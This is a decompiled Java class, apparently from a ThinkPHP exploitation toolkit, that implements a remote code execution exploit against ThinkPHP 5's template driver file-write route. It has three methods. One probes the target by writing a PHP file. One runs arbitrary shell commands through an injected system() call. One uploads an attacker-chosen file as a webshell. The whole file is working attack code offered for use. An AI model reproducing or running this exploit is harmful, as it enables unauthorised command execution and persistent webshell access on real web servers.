/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.net.URLEncoder;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_templalte_driver_rce
/*    */   implements BaseExp {
/* 12 */   private String results = null;
/* 13 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 18 */     HttpTool.get(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=mqz.php&content=%3C?php%20var_dump(md5(2333));?%3E", this.property);
/* 19 */     Response response = HttpTool.get(url + "/mqz.php", this.property);
/* 20 */     if (response.getText().contains("56540676a129760a")) {
/* 21 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 22 */       return this.results;
/*    */     } 
/* 24 */     if (response.getError() != null) {
/* 25 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 26 */       return this.results;
/*    */     } 
/* 28 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 29 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 34 */     HttpTool.get(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=&content=%3C?php%20system(\"" + cmd + "\");?%3E", this.property);
/* 35 */     Response response = HttpTool.get(url + "/mqz.php", this.property);
/* 36 */     if (response.getError() == null) {
/* 37 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 39 */       this.results = response.getError();
/*    */     } 
/* 41 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 47 */       content = URLEncoder.encode(content, "UTF-8");
/* 48 */       String payload = url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=" + fileName + "&content=" + content;
/* 49 */       Response response = HttpTool.get(payload, this.property);
/* 50 */       if (response.getError() == null) {
/* 51 */         response = HttpTool.get(url + "/" + fileName, this.property);
/* 52 */         if (response.getCode() == 200) {
/* 53 */           this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/*    */         } else {
/* 55 */           this.results = "[-] 上传失败！";
/*    */         } 
/*    */       } else {
/* 58 */         this.results = "[-] 上传失败: " + response.getError();
/*    */       } 
/* 60 */     } catch (Exception e) {
/* 61 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 63 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_templalte_driver_rce.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */